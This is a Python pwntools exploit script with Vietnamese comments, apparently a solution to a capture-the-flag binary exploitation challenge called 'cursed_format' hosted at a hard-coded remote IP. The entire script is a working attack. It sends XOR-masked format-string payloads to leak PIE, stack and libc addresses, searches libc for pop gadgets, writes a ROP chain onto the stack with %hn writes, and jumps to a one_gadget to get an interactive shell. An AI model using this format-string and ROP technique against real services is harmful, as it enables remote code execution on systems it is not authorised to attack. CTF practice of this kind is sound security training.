from pwn import *

# --- CẤU HÌNH ---
context.log_level = 'info'
BINARY = './cursed_format'
HOST = '18.212.136.134'
PORT = 8887
LIBC_FILE = './libc_remote.so'

# OFFSET ĐÃ CHỐT
STACK_DIFF = 0x58
ONE_GADGET_OFF = 0xc830a # Yêu cầu r12=0, r13=0

p = remote(HOST, PORT)
exe = ELF(BINARY, checksec=False)
context.binary = exe

# Load Libc
try:
    libc = ELF(LIBC_FILE, checksec=False)
    print("[+] Loaded libc_remote.so")
except:
    log.error("Thiếu file libc_remote.so!")
    exit()

# Setup XOR
current_key = b'\xff' * 32
def send_fmt(payload):
    global current_key
    payload = payload.ljust(32, b'\x00')
    to_send = bytes([a ^ b for a, b in zip(payload, current_key)])
    p.sendlineafter(b'>> ', b'1')
    sleep(0.05)
    p.send(to_send)
    current_key = payload
    return p.recvuntil(b'1. Keep', drop=True)

def solve():
    print("[*] Giai đoạn 1: Leak Addresses...")
    
    # Leak PIE & Stack
    out = send_fmt(b'%20$p|%1$p').split(b'|')
    pie_base = int(out[0], 16) - 0x12f4
    stack_addr = int(out[1], 16)
    
    # Leak Libc (Puts)
    exe.address = pie_base
    puts_got = exe.got['puts']
    leak_puts = send_fmt(b'%7$s' + b'\x00'*4 + p64(puts_got))
    puts_addr = u64(leak_puts[:6].ljust(8, b'\x00'))
    
    libc.address = puts_addr - libc.symbols['puts']
    print(f"[+] Libc Base: {hex(libc.address)}")

    # ---------------------------------------------------------
    # Giai đoạn 2: Tìm Gadget để dọn dẹp Register (Satisfy Constraints)
    # Mục tiêu: r12 = 0, r13 = 0 trước khi nhảy vào One Gadget
    print("[*] Giai đoạn 2: Tìm Gadget dọn dẹp thanh ghi...")
    
    rop = ROP(libc)
    try:
        # Tìm gadget pop r12; ret
        pop_r12 = rop.find_gadget(['pop r12', 'ret'])[0]
        # Tìm gadget pop r13; ret
        pop_r13 = rop.find_gadget(['pop r13', 'ret'])[0]
    except:
        # Nếu không tìm thấy gadget đơn lẻ, thử tìm gadget gộp (pop r12; pop r13; ret)
        print("[!] Không tìm thấy gadget đơn, thử gadget gộp...")
        try:
             # Đây là gadget phổ biến: pop r12; pop r13; pop r14; pop r15; ret
             pop_r12_r13_r14_r15 = rop.find_gadget(['pop r12', 'pop r13', 'pop r14', 'pop r15', 'ret'])[0]
             # Chain sẽ là: GADGET -> 0 -> 0 -> 0 -> 0 -> ONE_GADGET
             rop_chain = [pop_r12_r13_r14_r15, 0, 0, 0, 0, libc.address + ONE_GADGET_OFF]
             
             print("[+] Dùng Gadget gộp r12-r15")
             final_chain = rop_chain
        except:
            log.error("Không tìm thấy gadget phù hợp trong libc này!")
            return
    else:
        # Nếu tìm thấy gadget đơn lẻ
        print(f"[+] Pop R12: {hex(pop_r12)}")
        print(f"[+] Pop R13: {hex(pop_r13)}")
        
        # Chain: POP_R12 -> 0 -> POP_R13 -> 0 -> ONE_GADGET
        final_chain = [pop_r12, 0, pop_r13, 0, libc.address + ONE_GADGET_OFF]

    target_ret = stack_addr + STACK_DIFF
    print(f"[+] Target Stack: {hex(target_ret)}")
    print(f"[+] Chain Length: {len(final_chain)} words")

    # ---------------------------------------------------------
    # Giai đoạn 3: Ghi đè
    def write_val(addr, val):
        for i in range(4):
            part = (val >> (16 * i)) & 0xffff
            tgt = addr + (i * 2)
            if part == 0: part = 0x10000
            fmt = f"%{part}c%9$hn".encode()
            pad = 24 - len(fmt)
            send_fmt(fmt + b'A'*pad + p64(tgt))

    print("[*] Writing ROP chain...")
    curr = target_ret
    for val in final_chain:
        write_val(curr, val)
        curr += 8

    # 4. Trigger
    print("[*] Triggering Shell...")
    p.sendlineafter(b'>> ', b'2')
    
    p.clean()
    p.interactive()

if __name__ == "__main__":
    solve()